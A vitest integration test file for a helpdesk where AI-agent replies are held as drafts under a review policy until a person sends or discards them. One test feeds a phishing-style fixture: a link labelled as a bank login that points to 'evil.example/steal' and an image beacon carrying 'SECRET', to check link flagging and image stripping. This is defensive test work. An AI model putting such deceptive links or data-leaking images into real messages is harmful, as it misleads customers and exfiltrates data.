import { randomUUID } from "node:crypto";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { eq, inArray } from "drizzle-orm";
import { migrate } from "drizzle-orm/postgres-js/migrator";
import { db, sqlClient } from "../src/server/db";
import {
  agents,
  audit,
  connections,
  jobs,
  memberships,
  messages,
  projects,
  tickets,
  user,
} from "../src/server/db/schema";
import { discardDraft, getTicket, reply, sendDraft } from "../src/server/operations";
import { getConfig, putConfig } from "../src/server/configuration";
import { runNext } from "../src/worker/jobs";
import type { Action, Principal } from "../src/domain/permissions";
import { startFakeSmtp, type FakeSmtp } from "./support/smtp";
const projectId = randomUUID();
const connectionId = randomUUID();
const personId = `person-${projectId}`;
let agentId = "";
let smtp: FakeSmtp;
const person = (held: Action[], id = personId): Principal => ({
  id,
  kind: "human",
  active: true,
  owner: false,
  grants: [{ projectId, actions: held }],
});
const manager = person([
  "project.read",
  "ticket.read",
  "ticket.reply",
  "ticket.resolve",
  "config.read",
  "config.write",
  "config.approve",
]);
const reader = person(["project.read", "ticket.read"], `reader-${projectId}`);
const answerer = person(["project.read", "ticket.read", "ticket.reply"], `answerer-${projectId}`);
const agent = (): Principal => ({
  id: agentId,
  kind: "agent",
  active: true,
  owner: false,
  grants: [
    {
      projectId,
      actions: [
        "project.read",
        "ticket.read",
        "ticket.reply",
        "ticket.resolve",
        "ticket.note",
        "config.read",
      ],
    },
  ],
});
async function ticket(values: Partial<typeof tickets.$inferInsert> = {}) {
  const [row] = await db()
    .insert(tickets)
    .values({
      projectId,
      subject: "Draft",
      requesterEmail: "kim@example.test",
      requesterName: "Kim",
      language: "en",
      pendingSince: new Date(Date.now() - 3_600_000),
      assigneeAgentId: agentId,
      ...values,
    })
    .returning();
  await db()
    .insert(messages)
    .values({
      ticketId: row?.id ?? "",
      authorType: "customer",
      authorName: "Kim",
      authorEmail: "kim@example.test",
      markdown: "Question",
      language: "en",
      deliveryState: "received",
    });
  return row?.id ?? "";
}
const draftBody = (revision: number, extra: Record<string, unknown> = {}) => ({
  markdown: `Answer ${randomUUID()}`,
  internal: false,
  expectedRevision: revision,
  idempotencyKey: randomUUID(),
  language: "en",
  resolve: false,
  ...extra,
});
const setPolicy = async (policy: "review" | "direct") => {
  const read = await getConfig(manager, projectId);
  if (read.config.approvalPolicy !== policy)
    await putConfig(manager, projectId, {
      config: { ...read.config, approvalPolicy: policy },
      expectedVersion: read.version,
    });
};
beforeAll(async () => {
  // The fake server is a development connection; the worker only uses those on a
  // development stack.
  vi.stubEnv("NODE_ENV", "development");
  vi.stubEnv("DEV_BOOTSTRAP", "true");
  await migrate(db(), { migrationsFolder: "drizzle" });
  smtp = await startFakeSmtp();
  await db()
    .insert(projects)
    .values({
      id: projectId,
      name: "Drafts",
      slug: `drafts-${projectId}`,
      settings: { outboundConnectionId: connectionId },
    });
  await db()
    .insert(connections)
    .values({
      id: connectionId,
      projectId,
      kind: "smtp",
      name: "Fake",
      direction: "outbound",
      status: "ready",
      config: {
        host: "127.0.0.1",
        port: smtp.port,
        secure: false,
        from: "support@example.test",
        replyTo: "support@example.test",
        developmentOnly: true,
      },
    });
  await db()
    .insert(user)
    .values({
      id: personId,
      name: "Person",
      email: `${personId}@example.test`,
      emailVerified: true,
    });
  await db()
    .insert(memberships)
    .values({ userId: personId, projectId, actions: ["ticket.reply", "ticket.resolve"] });
  const [created] = await db()
    .insert(agents)
    .values({
      name: "Drafter",
      projectId,
      actions: ["ticket.read", "ticket.reply"],
      tokenHash: randomUUID(),
      expiresAt: new Date(Date.now() + 3_600_000),
    })
    .returning({ id: agents.id });
  agentId = created?.id ?? "";
});
afterAll(async () => {
  vi.unstubAllEnvs();
  await smtp.close();
  await db().delete(jobs).where(eq(jobs.projectId, projectId));
  await db()
    .delete(audit)
    .where(inArray(audit.projectId, [projectId]));
  await db().delete(tickets).where(eq(tickets.projectId, projectId));
  await db().delete(agents).where(eq(agents.projectId, projectId));
  await db().delete(projects).where(eq(projects.id, projectId));
  await db().delete(user).where(eq(user.id, personId));
  await sqlClient().end();
});
const jobsOf = (id: string) =>
  db()
    .select()
    .from(jobs)
    .where(eq(jobs.projectId, projectId))
    .then((rows) => rows.filter((row) => row.payload.ticketId === id));
// Runs every queued job of the project, so that earlier tests of this file do
// not stand in the way.
const drain = async () => {
  while (await runNext({ projectId }));
};
describe("a reply by an agent under the review policy", () => {
  it("is a draft that is not sent, leaves the conversation as it is and names the draft", async () => {
    await setPolicy("review");
    const id = await ticket();
    const revision = (await getTicket(manager, id)).ticket.revision;
    const result = await reply(agent(), id, draftBody(revision));
    expect(result).toMatchObject({ duplicate: false, draft: true });
    const [message] = await db().select().from(messages).where(eq(messages.id, result.id));
    expect(message).toMatchObject({ deliveryState: "draft", authorType: "agent", internal: false });
    expect(message?.source).toMatchObject({ draft: { baseRevision: revision, resolve: false } });
    // No mail job exists, and the ticket is as it was.
    expect((await jobsOf(id)).map((job) => job.type)).toEqual(["draft.recorded"]);
    expect((await getTicket(manager, id)).ticket).toMatchObject({ revision, status: "open" });
    expect(smtp.messages).toHaveLength(0);
  });
  it("shows the person who sends it where its links lead, and only for a draft", async () => {
    await setPolicy("review");
    const id = await ticket();
    const revision = (await getTicket(manager, id)).ticket.revision;
    const markdown = [
      "Please [sign in](https://portal.example.test/login) and see",
      "[https://bank.example/login](https://evil.example/steal?d=1).",
      "![x](https://evil.example/p.png?d=SECRET)",
    ].join(" ");
    const draft = await reply(agent(), id, draftBody(revision, { markdown }));
    const note = await reply(agent(), id, draftBody(revision, { markdown, internal: true }));
    const { messages: conversation } = await getTicket(manager, id);
    expect(conversation.find((entry) => entry.id === draft.id)?.links).toEqual([
      {
        text: "sign in",
        url: "https://portal.example.test/login",
        host: "portal.example.test",
        misleading: false,
      },
      {
        text: "https://bank.example/login",
        url: "https://evil.example/steal?d=1",
        host: "evil.example",
        misleading: true,
      },
    ]);
    // An internal note is no draft and needs no check.
    expect(conversation.find((entry) => entry.id === note.id)?.links).toEqual([]);
    // The image is not in the HTML either.
    expect(conversation.find((entry) => entry.id === draft.id)?.html).not.toContain("<img");
  });
  it("a repeated request returns the same draft, and a stale revision is a conflict", async () => {
    const id = await ticket();
    const revision = (await getTicket(manager, id)).ticket.revision;
    const body = draftBody(revision);
    const first = await reply(agent(), id, body);
    expect(await reply(agent(), id, body)).toEqual({ ...first, duplicate: true });
    await expect(reply(agent(), id, draftBody(revision + 3))).rejects.toMatchObject({
      code: "conflict",
    });
    expect(
      (await db().select().from(messages).where(eq(messages.ticketId, id))).filter(
        (m) => m.deliveryState === "draft",
      ),
    ).toHaveLength(1);
  });
  it("is not a draft when it is an internal note, or when a person writes it", async () => {
    const id = await ticket();
    const revision = (await getTicket(manager, id)).ticket.revision;
    expect(await reply(agent(), id, draftBody(revision, { internal: true }))).toMatchObject({
      draft: false,
    });
    const queued = await reply(manager, id, draftBody(revision + 1));
    expect(queued).toMatchObject({ draft: false });
    expect((await jobsOf(id)).filter((job) => job.type === "mail.send")).toHaveLength(1);
  });
});
describe("sending a draft", () => {
  it("is done by a person, queues the mail as that person and sends it", async () => {
    await setPolicy("review");
    const id = await ticket();
    const revision = (await getTicket(manager, id)).ticket.revision;
    const draftText = `Resolving answer ${randomUUID()}`;
    const draft = await reply(
      agent(),
      id,
      draftBody(revision, { resolve: true, markdown: draftText }),
    );
    expect(await sendDraft(manager, draft.id)).toEqual({ id: draft.id, state: "queued" });
    const [job] = (await jobsOf(id)).filter((entry) => entry.type === "mail.send");
    expect(job?.payload).toMatchObject({
      actorKind: "human",
      actorId: personId,
      resolve: true,
      messageId: draft.id,
    });
    expect((await getTicket(manager, id)).ticket.revision).toBe(revision + 1);
    await drain();
    expect(smtp.messages.some((raw) => raw.includes(draftText))).toBe(true);
    const { ticket: after, messages: conversation } = await getTicket(manager, id);
    expect(after).toMatchObject({ status: "resolved", pendingSince: null });
    expect(conversation.find((m) => m.id === draft.id)).toMatchObject({
      deliveryState: "sent",
      authorType: "agent",
    });
    const [entry] = await db().select().from(audit).where(eq(audit.targetId, draft.id));
    expect(entry?.action).toBe("ticket.draft");
    await expect(sendDraft(manager, draft.id)).rejects.toMatchObject({ code: "conflict" });
  });
  it("is refused when the ticket changed since the draft was written", async () => {
    const id = await ticket();
    const revision = (await getTicket(manager, id)).ticket.revision;
    const draft = await reply(agent(), id, draftBody(revision));
    // A customer wrote in the meantime.
    await db()
      .update(tickets)
      .set({ revision: revision + 1 })
      .where(eq(tickets.id, id));
    await expect(sendDraft(manager, draft.id)).rejects.toMatchObject({ code: "conflict" });
    expect(
      (await db().select().from(messages).where(eq(messages.id, draft.id)))[0]?.deliveryState,
    ).toBe("draft");
    expect((await jobsOf(id)).filter((job) => job.type === "mail.send")).toEqual([]);
  });
  it("is refused for an agent, for a person without ticket.reply, for resolving without ticket.resolve and for junk", async () => {
    const id = await ticket();
    const revision = (await getTicket(manager, id)).ticket.revision;
    const draft = await reply(agent(), id, draftBody(revision));
    await expect(sendDraft(agent(), draft.id)).rejects.toMatchObject({ code: "forbidden" });
    await expect(sendDraft(reader, draft.id)).rejects.toMatchObject({ code: "forbidden" });
    await expect(sendDraft(person(["config.read"], "stranger"), draft.id)).rejects.toMatchObject({
      code: "not_found",
    });
    const resolving = await reply(agent(), id, draftBody(revision, { resolve: true }));
    await expect(sendDraft(answerer, resolving.id)).rejects.toMatchObject({ code: "forbidden" });
    await db().update(tickets).set({ junkAt: new Date() }).where(eq(tickets.id, id));
    await expect(sendDraft(manager, draft.id)).rejects.toMatchObject({ code: "conflict" });
    await expect(sendDraft(manager, randomUUID())).rejects.toMatchObject({ code: "not_found" });
  });
});
describe("discarding a draft", () => {
  it("is done by a person, once, and the draft is never sent", async () => {
    const id = await ticket();
    const revision = (await getTicket(manager, id)).ticket.revision;
    const draft = await reply(agent(), id, draftBody(revision));
    await expect(discardDraft(agent(), draft.id)).rejects.toMatchObject({ code: "forbidden" });
    await expect(discardDraft(reader, draft.id)).rejects.toMatchObject({ code: "forbidden" });
    expect(await discardDraft(manager, draft.id)).toEqual({ id: draft.id, state: "discarded" });
    await expect(discardDraft(manager, draft.id)).rejects.toMatchObject({ code: "conflict" });
    await expect(sendDraft(manager, draft.id)).rejects.toMatchObject({ code: "conflict" });
    expect((await jobsOf(id)).filter((job) => job.type === "mail.send")).toEqual([]);
  });
});
describe("an agent under the direct policy", () => {
  it("queues the reply as before, and a project switched back to review drafts again", async () => {
    await setPolicy("direct");
    const id = await ticket();
    const revision = (await getTicket(manager, id)).ticket.revision;
    const directText = `Direct answer ${randomUUID()}`;
    const sent = await reply(agent(), id, draftBody(revision, { markdown: directText }));
    expect(sent).toMatchObject({ draft: false });
    const [job] = (await jobsOf(id)).filter((entry) => entry.type === "mail.send");
    expect(job?.payload).toMatchObject({ actorKind: "agent", actorId: agentId });
    await drain();
    expect(smtp.messages.some((raw) => raw.includes(directText))).toBe(true);
    await setPolicy("review");
    const next = await ticket();
    expect(
      await reply(agent(), next, draftBody((await getTicket(manager, next)).ticket.revision)),
    ).toMatchObject({ draft: true });
  });
  it("does not send when the project is on review at dispatch time", async () => {
    await setPolicy("direct");
    const id = await ticket();
    const queued = await reply(
      agent(),
      id,
      draftBody((await getTicket(manager, id)).ticket.revision),
    );
    expect(queued.draft).toBe(false);
    await setPolicy("review");
    const before = smtp.messages.length;
    await drain();
    expect(smtp.messages.length).toBe(before);
    const [job] = (await jobsOf(id)).filter((entry) => entry.type === "mail.send");
    expect(job).toMatchObject({
      status: "review",
      lastErrorCode: "autonomous_dispatch_not_enabled",
    });
  });
});
